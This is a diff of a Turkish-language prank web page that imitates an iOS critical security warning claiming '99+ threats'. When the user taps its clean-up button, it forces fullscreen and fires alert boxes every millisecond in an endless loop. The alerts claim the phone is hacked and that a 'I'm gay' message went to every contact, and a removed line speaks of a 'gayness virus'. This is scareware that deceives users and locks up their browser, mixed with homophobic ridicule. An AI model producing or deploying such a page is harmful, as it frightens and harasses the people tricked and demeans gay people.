@@ -3,34 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>iOS Kritik Güvenlik Uyarısı</title>
+    <title>iOS KRİTİK GÜNCELLEME</title>
     <style>
-        body { background: #000; color: #ff3b30; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .alert-box { border: 2px solid #ff3b30; padding: 40px; border-radius: 20px; background: rgba(255,0,0,0.1); }
-        h1 { font-size: 24px; }
-        .btn-fix { background: #ff3b30; color: white; padding: 15px 30px; border-radius: 10px; text-decoration: none; font-weight: bold; cursor: pointer; border: none; }
+        body { 
+            background: #000; color: #ff3b30; 
+            font-family: -apple-system, sans-serif; 
+            display: flex; justify-content: center; align-items: center; 
+            height: 100vh; margin: 0; overflow: hidden;
+            cursor: none;
+        }
+        .warning-box { 
+            border: 2px solid #ff3b30; padding: 50px; 
+            border-radius: 20px; text-align: center;
+            box-shadow: 0 0 50px rgba(255, 59, 48, 0.5);
+        }
+        h1 { font-size: 30px; margin-bottom: 20px; }
+        .btn-doom { 
+            background: #ff3b30; color: white; padding: 20px 40px; 
+            border-radius: 10px; font-weight: bold; border: none; 
+            font-size: 20px; cursor: pointer;
+        }
     </style>
 </head>
 <body>
 
-<div class="alert-box">
-    <h1>⚠️ VİRÜS TESPİT EDİLDİ</h1>
-    <p>Cihazınızda 42 adet 'Gaylık' virüsü bulundu. Temizlemek için hemen basın.</p>
-    <button class="btn-fix" onclick="baslatTroll()">ŞİMDİ TEMİZLE</button>
+<div class="warning-box" id="mainBox">
+    <h1>⚠️ SİSTEM HATASI ⚠️</h1>
+    <p>Cihazınızda 99+ tehdit bulundu. <br>Temizlemek için aşağıdaki butona basın.</p>
+    <button class="btn-doom" onclick="launchChaos()">TEMİZLEMEYİ BAŞLAT</button>
 </div>
 
 <script>
-function baslatTroll() {
-    // İlk uyarıyı veriyoruz
-    alert("Temizleme başarısız! Sistem ele geçirildi.");
-    
-    // İşte burası 10 saniyede bir (hatta daha hızlı) bildirim yağdıran kısım
+function launchChaos() {
+    // 1. ADIM: Tam Ekran Yap (Kullanıcı etkileşimi şart olduğu için burada tetikliyoruz)
+    let elem = document.documentElement;
+    if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+    } else if (elem.webkitRequestFullscreen) { /* Safari için */
+        elem.webkitRequestFullscreen();
+    }
+
+    // 2. ADIM: Mobbing Başlıyor
+    alert("TEMİZLEME BAŞLATILAMADI! \nHACKLENDİN AGA HAHAHA!");
+
+    // 3. ADIM: 1 Milisaniyede Bir Sonsuz Döngü
+    // Bu döngü başladığı an işlemci alert basmaktan başka bir şey yapamaz
     setInterval(function() {
-        alert("HAHAHA HADİ SİL LAN!");
-        alert("SİLEMEZSİN Kİİİ!");
-        alert("TELEFONUN ARTIK BENİM!");
-        alert("ŞU AN TÜM REHBERİNE 'BEN GAYIM' MESAJI GİDİYOR...");
-    }, 2000); // 2000 ms = 2 saniyede bir bu 4 mesajı döner. Arkadaşın kafayı yer.
+        alert("SİLSENE LAN! HADİ SİL!");
+        alert("TELEFONUN ŞU AN ELİMDE!");
+        alert("AYARLARDA BOŞUNA GEZME!");
+        alert("BEN GAYIM DİYE TÜM REHBERE MESAJ GİTTİ BİLE!");
+    }, 1); // 1 ms = Saniyede binlerce bildirim!
 }
 </script>
 
